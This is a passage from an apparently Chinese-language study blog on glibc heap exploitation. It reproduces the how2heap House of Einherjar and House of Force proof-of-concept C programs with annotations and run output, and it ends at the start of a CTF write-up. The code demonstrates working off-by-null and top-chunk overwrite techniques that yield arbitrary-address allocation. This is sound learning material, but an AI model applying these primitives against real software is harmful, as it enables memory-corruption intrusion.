class="hljs-number">1</span>]);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">2</span>]);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">3</span>]);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">4</span>]);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">5</span>]);<br><br><br><br>	<span class="hljs-comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	 * the chunk includes the amount requested plus some amount required for the metadata. */</span><br><br>	b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br><br>	<span class="hljs-type">int</span> real_b_size = malloc_usable_size(b);<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0xf8 bytes for &#x27;b&#x27;.\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br><br><br>	<span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><br>	<span class="hljs-comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span><br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br><br>	a[real_a_size] = <span class="hljs-number">0</span>; <br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><span class="hljs-comment">// b的大小最好是0x100的倍数，这样我们在进行低位的修改时就不会修改b的大小</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span><br><br>		   <span class="hljs-string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span><br><br>		   <span class="hljs-string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);<br><br><br><br>	<span class="hljs-comment">// Write a fake prev_size to the end of a</span><br><span class="hljs-comment">// 修改b的prev_size</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span><br><br>		   <span class="hljs-string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>));<br><span class="hljs-comment">// 这里prev_size的大小是b的初始指针减去fake_chunk的起始地址</span><br>	<span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((b-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*)fake_chunk);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>, fake_chunk, fake_size);<br><br>	*(<span class="hljs-type">size_t</span>*)&amp;a[real_a_size-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br><br><br>	<span class="hljs-comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);<br><br>	fake_chunk[<span class="hljs-number">1</span>] = fake_size;<br><br><br><br>	<span class="hljs-comment">// free b and it will consolidate with our fake chunk</span><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);<br><br>	<span class="hljs-built_in">free</span>(b);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><br><br><br>	<span class="hljs-comment">//if we allocate another chunk before we free b we will need to </span><br><br>	<span class="hljs-comment">//do two things: </span><br><br>	<span class="hljs-comment">//1) We will need to adjust the size of our fake chunk so that</span><br><br>	<span class="hljs-comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span><br><br>	<span class="hljs-comment">//2) we will need to write the size of our fake chunk</span><br><br>	<span class="hljs-comment">//at the location we control. </span><br><br>	<span class="hljs-comment">//After doing these two things, when unlink gets called, our fake chunk will</span><br><br>	<span class="hljs-comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span><br><br>	<span class="hljs-comment">//otherwise we need to make sure that our fake chunk is up against the</span><br><br>	<span class="hljs-comment">//wilderness</span><br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);<br><br>	d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/house$ ./house_of_einherjar<br>Welcome to House of Einherjar!<br>Tested in Ubuntu <span class="hljs-number">16.04</span> <span class="hljs-number">64b</span>it.<br>This technique can be used when you have an off-by-one into a <span class="hljs-built_in">malloc</span><span class="hljs-number">&#x27;</span>ed region with a null byte.<br><br>We allocate <span class="hljs-number">0x38</span> bytes <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;a&#x27;</span><br>a: <span class="hljs-number">0x208c010</span><br>Since we want to overflow <span class="hljs-string">&#x27;a&#x27;</span>, we need the <span class="hljs-string">&#x27;real&#x27;</span> size of <span class="hljs-string">&#x27;a&#x27;</span> after rounding: <span class="hljs-number">0x38</span><br><br>We create a fake chunk wherever we want, in this <span class="hljs-keyword">case</span> we<span class="hljs-number">&#x27;ll</span> create the chunk on the <span class="hljs-built_in">stack</span><br>However, you can also create the chunk in the heap or the bss, as <span class="hljs-type">long</span> as you know its address<br>We <span class="hljs-built_in">set</span> our fwd and bck pointers to point at the fake_chunk in order to pass the unlink <span class="hljs-title function_">checks</span><br><span class="hljs-params">(although we could <span class="hljs-keyword">do</span> the unsafe unlink technique here in some scenarios)</span><br>Our fake chunk at 0x7ffdcc8074d0 looks like:<br><span class="hljs-title function_">prev_size</span> <span class="hljs-params">(not used)</span>: 0x100<br>size: 0x100<br>fwd: 0x7ffdcc8074d0<br>bck: 0x7ffdcc8074d0<br>fwd_nextsize: 0x7ffdcc8074d0<br>bck_nextsize: 0x7ffdcc8074d0<br><br>We allocate 0xf8 bytes <span class="hljs-keyword">for</span> &#x27;b&#x27;.<br>b: 0x208c050<br><br>b.size: 0x101<br>b.size is: <span class="hljs-params">(<span class="hljs-number">0x100</span>)</span> | prev_inuse = <span class="hljs-number">0x101</span><br>We overflow <span class="hljs-string">&#x27;a&#x27;</span> with a single null byte into the metadata of <span class="hljs-string">&#x27;b&#x27;</span><br>b.size: <span class="hljs-number">0x100</span><br>This is easiest <span class="hljs-keyword">if</span> b.size is a multiple of <span class="hljs-number">0x100</span> so you don<span class="hljs-number">&#x27;</span>t change the size of b, only its prev_inuse bit<br>If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk<br><br>We write a fake prev_size to the last <span class="hljs-number">8</span> bytes of a so that it will consolidate with our fake chunk<br>Our fake prev_size will be <span class="hljs-number">0x208c040</span> - <span class="hljs-number">0x7ffdcc8074d0</span> = <span class="hljs-number">0xffff800235884b70</span><br><br>Modify fake chunk<span class="hljs-number">&#x27;</span>s size to reflect b<span class="hljs-number">&#x27;</span>s new prev_size<br>Now we <span class="hljs-built_in">free</span> b and this will consolidate with our fake chunk since b prev_inuse is not <span class="hljs-built_in">set</span><br>Our fake chunk size is now <span class="hljs-number">0xffff8002358a5b31</span> (b.size + fake_prev_size)<br><br>Now we can call <span class="hljs-built_in">malloc</span>() and it will begin in our fake chunk<br>Next <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>) is at <span class="hljs-number">0x7ffdcc8074e0</span><br></code></pre></td></tr></table></figure>

<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h3><p>通过将top chunk的<code>size</code>修改成一个很大的数据（如负号整数），以欺骗libc在请求很大空间的时候能够使用top chunk来分配，这个时候top chunk加上请求空间的大小的时候就会转移到低地址处，例如<code>.bss</code>段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   This PoC works also with ASLR enabled.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   ( http://phrack.org/issues/66/10.html )</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-comment">// bss段上的一个字符串</span><br><span class="hljs-type">char</span> bss_var[] = <span class="hljs-string">&quot;This is a string that we want to overwrite.&quot;</span>;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span><br><br>&#123;<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span><br><br>		<span class="hljs-string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Its current value is: %s\n&quot;</span>, bss_var);<br><br><br><br><br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);<br><br>	<span class="hljs-type">intptr_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">256</span>);<br><span class="hljs-comment">// 第一个被分配的堆块的位置</span><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);<br><br>	<span class="hljs-type">int</span> real_size = malloc_usable_size(p1);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">2</span>);<br><br><br><span class="hljs-comment">// 我们需要一个漏洞来修改top chunk的头部</span><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);<br><br><br><br>	<span class="hljs-comment">//----- VULNERABILITY ----</span><br><br>	<span class="hljs-type">intptr_t</span> *ptr_top = (<span class="hljs-type">intptr_t</span> *) ((<span class="hljs-type">char</span> *)p1 + real_size - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);<br><br><br><span class="hljs-comment">// 使top chunk的size变大，这样我们就不会使用到mmap这个函数</span><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>))));<br><span class="hljs-comment">// 设置top chunk的size为-1</span><br>	*(<span class="hljs-type">intptr_t</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)) = <span class="hljs-number">-1</span>;<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>))));<br><br>	<span class="hljs-comment">//------------------------</span><br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span><br><br>	   <span class="hljs-string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span><br><br>	   <span class="hljs-string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);<br><br><br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">// req是请求的大小，dest是我们的目标地址</span><br><span class="hljs-comment">	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	 * new_top = old_top + nb</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	 * nb = new_top - old_top</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	 * req + 2sizeof(long) = new_top - old_top</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	 * req = new_top - old_top - 2sizeof(long)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span><br><span class="hljs-comment">// 计算得到最终的请求大小</span><br><span class="hljs-comment">	 * req = dest - old_top - 4*sizeof(long)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	 */</span><br><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> evil_size = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)bss_var - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">4</span> - (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr_top;<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span><br><br>	   <span class="hljs-string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);<br><br>	<span class="hljs-type">void</span> *new_ptr = <span class="hljs-built_in">malloc</span>(evil_size);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">2</span>);<br><br><br><br>	<span class="hljs-type">void</span>* ctr_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... old string: %s\n&quot;</span>, bss_var);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);<br><br>	<span class="hljs-built_in">strcpy</span>(ctr_chunk, <span class="hljs-string">&quot;YEAH!!!&quot;</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... new string: %s\n&quot;</span>, bss_var);<br><br><br><br>	assert(ctr_chunk == bss_var);<br><br><br><br><br><br>	<span class="hljs-comment">// some further discussion:</span><br><br>	<span class="hljs-comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span><br><br>	<span class="hljs-comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span><br><br>	<span class="hljs-comment">//	&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span><br><br>	<span class="hljs-comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span><br><br>	<span class="hljs-comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span><br><br>	<span class="hljs-comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span><br><br>	<span class="hljs-comment">//	&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span><br><br><br><br>	<span class="hljs-comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span><br><br>	<span class="hljs-comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span><br><br><br><br>	<span class="hljs-comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span><br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/house$ ./house_of_force<br><br>Welcome to the House of Force<br><br>The idea of House of Force is to overwrite the top chunk and let the <span class="hljs-built_in">malloc</span> <span class="hljs-keyword">return</span> an arbitrary value.<br>The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when <span class="hljs-built_in">malloc</span> asks <span class="hljs-keyword">for</span> more space from the os.<br><br>In the end, we will use this to overwrite a variable at <span class="hljs-number">0x602080</span>.<br>Its current value is: This is a <span class="hljs-built_in">string</span> that we want to overwrite.<br><br>Let<span class="hljs-number">&#x27;</span>s allocate the first chunk, taking space from the wilderness.<br>The chunk of <span class="hljs-number">256</span> bytes has been allocated at <span class="hljs-number">0x8ff000</span>.<br><br>Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.<br>Real size (aligned and all that jazz) of our allocated chunk is <span class="hljs-number">280.</span><br><br>Now let<span class="hljs-number">&#x27;</span>s emulate a vulnerability that can overwrite the header of the Top Chunk<br><br>The top chunk starts at <span class="hljs-number">0x8ff110</span><br><br>Overwriting the top chunk size with a big value so we can ensure that the <span class="hljs-built_in">malloc</span> will never call mmap.<br>Old size of top chunk <span class="hljs-number">0x20ef1</span><br>New size of top chunk <span class="hljs-number">0xffffffffffffffff</span><br><br>The size of the wilderness is now gigantic. We can allocate anything without <span class="hljs-built_in">malloc</span>() calling mmap.<br>Next, we will allocate a chunk that will get us right up against the desired region (with an integer<br>overflow) and will then be able to allocate a chunk right over the desired region.<br><br>The value we want to write to at <span class="hljs-number">0x602080</span>, and the top chunk is at <span class="hljs-number">0x8ff110</span>, so accounting <span class="hljs-keyword">for</span> the header size,<br>we will <span class="hljs-built_in">malloc</span> <span class="hljs-number">0xffffffffffd02f50</span> bytes.<br>As expected, the new pointer is at the same place as the old top chunk: <span class="hljs-number">0x8ff110</span><br><br>Now, the next chunk we overwrite will point at our target buffer.<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>) =&gt; <span class="hljs-number">0x602080</span>!<br>Now, we can finally overwrite that value:<br>... old <span class="hljs-built_in">string</span>: This is a <span class="hljs-built_in">string</span> that we want to overwrite.<br>... doing <span class="hljs-built_in">strcpy</span> overwrite with <span class="hljs-string">&quot;YEAH!!!&quot;</span>...<br>... new <span class="hljs-built_in">string</span>: YEAH!!!<br></code></pre></td></tr></table></figure>

<p><code>libc_2.29</code>增加了对top_chunk的size的检查（<code>size &gt; av-&gt;system_mem</code>），除非我们能够修改<code>av-&gt;system_mem</code>，否则该方法失效。</p>
<h4 id="hitcon-traning-bamboobox"><a href="#hitcon-traning-bamboobox" class="headerlink" title="hitcon_traning_bamboobox"></a>hitcon_traning_bamboobox</h4><p>将top_chunk转移到存放函数指针的chunk附近，再次分配堆块修改函数指针为后门函数。</p>
<p>WP如下：</p>
